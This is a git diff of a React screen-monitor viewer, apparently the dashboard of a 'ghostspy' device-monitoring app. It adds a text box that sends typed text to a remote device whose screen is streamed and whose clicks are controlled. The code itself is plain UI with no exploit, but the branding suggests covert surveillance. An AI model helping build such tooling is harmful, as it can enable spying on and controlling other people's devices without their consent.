@@ -1,10 +1,11 @@
 import React, { useEffect, useState, useRef } from "react";
-import { Grid, CircularProgress, CardMedia, Tooltip, Button } from "@mui/material";
+import { Grid, CircularProgress, CardMedia, Tooltip, Button, Box, TextField } from "@mui/material";
 import { useTranslation } from "react-i18next";
 import { useDrag } from "react-use-gesture";
 
 import MenuIcon from "@mui/icons-material/Menu";
 import { IconButton, Menu } from "@mui/material";
+import SendOutlinedIcon from "@mui/icons-material/SendOutlined";
 
 import { useSocket } from "../../hooks/use-socket";
 import { useSocketFunctions } from "../../utils/socket";
@@ -16,8 +17,13 @@ import Color from "src/theme/colors";
 
 const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
   const { t } = useTranslation();
-  const { onSocketMonitor, onScreenClickEvent, onScreenDragEvent, onSocketCloseMonitor } =
-    useSocketFunctions();
+  const {
+    onSocketMonitor,
+    onScreenClickEvent,
+    onScreenDragEvent,
+    onSocketCloseMonitor,
+    onSendTextEvent,
+  } = useSocketFunctions();
   const { socket } = useSocket();
   const imageRef = useRef(null);
 
@@ -38,6 +44,8 @@ const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
   const [positions, setPositions] = useState([]);
   const [isDragging, setIsDragging] = useState(false);
   const [mouseDown, setMouseDown] = useState(false);
+  const [messageOpen, setmessageOpen] = useState(false);
+  const [message, setMessage] = useState(null);
 
   const black = localStorage.getItem("black");
   const lock = localStorage.getItem("lock");
@@ -57,6 +65,7 @@ const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
               const base64Image = data.response?.base64Image;
               setScreenCode(base64Image);
               setChangeLoading(false);
+              setmessageOpen(true);
             }
           };
 
@@ -74,6 +83,21 @@ const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
 
     monitorDevice();
   }, [monitor]);
+
+  // send screen text
+  const onSendInputText = async () => {
+    setmessageOpen(false);
+    try {
+      const deviceId = device?.deviceId;
+
+      await onSendTextEvent(SocketIOPublicEvents.screen_send_text_event, {
+        deviceId,
+        message,
+      });
+    } catch (error) {
+      console.log("send text error", error);
+    }
+  };
 
   // Close
   const onCloseModal = async () => {
@@ -317,23 +341,85 @@ const ScreenMonitorViewer = ({ monitor, device, onClose }) => {
                 // onClick={onPositionEvent}
                 {...bind()}
               ></Grid>
-              <CardMedia
-                className="screen-body"
-                component="img"
-                src={`data:image/png;base64, ${screenCode}`}
-                sx={{
-                  cursor: "default",
-                  width: "100%",
-                  height: "100%",
-                  borderRadius: "0px",
-                  position: "absolute", // Ensure CardMedia is positioned absolutely
-                  top: 0,
-                  left: 0,
-                  zIndex: 1, // Ensure this is below the red grid
-                }}
-                onLoad={onImageLoad}
-                ref={imageRef}
-              />
+
+              {screenCode ? (
+                <CardMedia
+                  className="screen-body"
+                  component="img"
+                  src={`data:image/png;base64, ${screenCode}`}
+                  sx={{
+                    cursor: "default",
+                    width: "100%",
+                    height: "100%",
+                    borderRadius: "0px",
+                    position: "absolute",
+                    top: 0,
+                    left: 0,
+                    zIndex: 1,
+                  }}
+                  onLoad={onImageLoad}
+                  ref={imageRef}
+                />
+              ) : (
+                <CardMedia
+                  className="screen-body"
+                  component="img"
+                  src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
+                  sx={{
+                    cursor: "default",
+                    width: "auto",
+                    height: "auto",
+                    borderRadius: "0px",
+                  }}
+                />
+              )}
+
+              {messageOpen && (
+                <Box
+                  onMouseDown={preventDrag}
+                  onTouchStart={preventDrag}
+                  sx={{
+                    position: "absolute",
+                    bottom: "-50px",
+                    width: "100%",
+                    zIndex: 99999,
+                  }}
+                >
+                  <Box
+                    sx={{
+                      display: "flex",
+                      alignItems: "center",
+                      gap: "10px",
+                      position: "relative",
+                    }}
+                  >
+                    <TextField
+                      className="screen-message"
+                      fullWidth
+                      // label={t("devicesPage.monitors.skeleton-input")}
+                      value={message?.text || ""}
+                      onChange={(e) => setMessage({ ...message, text: e.target.value })}
+                      inputProps={{
+                        style: {
+                          backgroundColor: Color.background.main,
+                          padding: "10px 50px 10px 10px",
+                        },
+                      }}
+                    />
+                    <SendOutlinedIcon
+                      onClick={() => onSendInputText()}
+                      sx={{
+                        backgroundColor: Color.background.main,
+                        position: "absolute",
+                        right: "1%",
+                        color: Color.text.primary,
+                        cursor: "pointer",
+                        fontSize: "30px",
+                      }}
+                    />
+                  </Box>
+                </Box>
+              )}
             </Grid>
           )}
         </Grid>
